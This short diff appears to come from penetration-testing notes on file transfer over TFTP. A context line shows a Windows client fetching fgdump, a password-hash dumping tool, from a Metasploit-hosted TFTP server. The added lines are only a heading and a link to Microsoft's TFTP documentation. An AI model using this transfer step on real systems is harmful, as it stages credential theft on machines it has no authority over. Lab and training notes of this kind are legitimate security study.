@@ -38,3 +38,7 @@ msf auxiliary(tftp) >
 From the Windows client:
 TFTP.EXE -i 10.11.0.159 get fgdump.exe C:\Users\Public
 
+#TFTP manual
+https://technet.microsoft.com/en-us/library/ff698993(v=ws.11).aspx
+
+
